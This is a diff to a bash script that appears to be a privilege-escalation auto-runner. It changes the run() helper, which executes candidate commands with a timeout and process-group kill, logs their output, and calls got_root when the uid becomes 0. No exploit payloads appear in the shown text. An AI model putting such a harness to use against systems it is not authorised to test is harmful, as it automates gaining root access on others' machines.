@@ -123,13 +123,30 @@ got_root() {
 run() {
     echo -e "${CYAN}[>] Trying: $1${NC}"
     echo "==== $1 ====" >> $LOGFILE
-    if [ "$HAS_TIMEOUT" = "1" ]; then
-        timeout -k 5 90 bash -c "$1" </dev/null 2>&1 | tee -a $LOGFILE | sed 's/^/    /'
-        RC=${PIPESTATUS[0]}
+    local OUT=$WRK/.out.$$
+    if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
+        setsid bash -c "$1" </dev/null >"$OUT" 2>&1 &
+        local PID=$!
+        local S=0
+        while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
+            sleep 1; S=$((S+1))
+        done
+        if kill -0 $PID 2>/dev/null; then
+            echo -e "${YELLOW}    [timeout] killing process group...${NC}"
+            kill -- -$PID 2>/dev/null
+            sleep 2
+            kill -9 -- -$PID 2>/dev/null
+            RC=124
+        else
+            wait $PID 2>/dev/null
+            RC=$?
+        fi
     else
-        bash -c "$1" </dev/null 2>&1 | tee -a $LOGFILE | sed 's/^/    /'
-        RC=${PIPESTATUS[0]}
+        timeout -k 5 90 bash -c "$1" </dev/null >"$OUT" 2>&1
+        RC=$?
     fi
+    sed 's/^/    /' "$OUT" | tee -a $LOGFILE
+    rm -f "$OUT"
     if [ "$(id -u)" = "0" ]; then
         echo -e "${GREEN}[+] SUCCESS via: $1${NC}"
         got_root "$1"
